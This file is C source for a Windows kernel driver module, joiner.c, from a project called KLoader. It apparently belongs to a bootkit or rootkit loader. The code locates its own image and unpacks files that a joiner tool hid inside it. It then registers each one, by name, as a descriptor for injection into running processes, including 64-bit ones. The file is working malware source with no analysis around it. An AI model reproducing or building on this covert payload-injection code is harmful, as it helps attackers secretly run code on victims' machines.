//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KLoader project
//	
// module: 
//	joiner.c
// created: 
//	March 2011
// description: 
//	Support for files attached to the current image by FJ joiner utility.

#include <ntddk.h>
#include "ntddkex.h"
#include "kloader.h"
#include "..\bklib\bklib.h"
#include "depack.h"
#include "..\FJ\joiner.h"

//
//	Returns current image base.
PVOID	GetCurrentImageBase(VOID)
{
	PUSHORT	Position = (PUSHORT)((ULONG_PTR)&GetCurrentImageBase & (ULONG_PTR)~0xfff);

	while (*Position != IMAGE_DOS_SIGNATURE)
		Position -= 0x1000 / sizeof(USHORT);

	return((PVOID)Position);
}


//
//	Enumerates attached files, unpacks proper ones, and fills INJECT_DESCRIPTORs array.
VOID	InitializeAddons(VOID)
{
	PIMAGE_DOS_HEADER	LoaderBase = (PIMAGE_DOS_HEADER)BkImageBase;
	PADDON_DESCRIPTOR	AdDesc;

	if (!LoaderBase)
		LoaderBase = (PIMAGE_DOS_HEADER)GetCurrentImageBase();

	AdDesc = FirstAddonDescriptor(LoaderBase);

	while (AdDesc->Magic != 0 && AdDesc->Magic != ADDON_MAGIC)
		AdDesc += 1;

	while (AdDesc->Magic == ADDON_MAGIC)
	{
		PCHAR	Unpacked;
		if (Unpacked = ExAllocatePool(PagedPool, AdDesc->ImageSize))
		{
			if (aP_depack((PCHAR)LoaderBase + AdDesc->ImageRva, Unpacked) == AdDesc->ImageSize)
			{
				PCHAR	Name = (PCHAR)&AdDesc->Data;
				ULONG	NameLen, Length = sizeof(ADDON_DESCRIPTOR);
				PINJECT_DESCRIPTOR	InjDesc;
				while(Length < AdDesc->Size)
				{					
					ULONG	Flags = 0;

					if (AdDesc->Flags & PE_FLAG_X64)
						Flags |= INJECT_AMD64_PROCESS;

					NameLen = strlen(Name);
					if (InjDesc = AllocateInjectDescriptor(Name, Unpacked, ATTACH_COUNT_MAX, Flags))
						InsertInjectDescriptor(InjDesc);
					Name += NameLen + 1;
					Length += NameLen + 1;
				}	// while(Length < AdDesc->Size)
			}	// if (aP_depack((PCHAR)LoaderBase + AdDesc->ImageRva, Unpacked) == AdDesc->ImageSize)
			else
				ExFreePool(Unpacked);
		}	// if (Unpacked = ExAllocatePool(PagedPool, PackedHeader->OriginalSize))
		AdDesc = NextAddonDescriptor(AdDesc);
	}	// while (AdDesc->Magic == ADDON_MAGIC)
}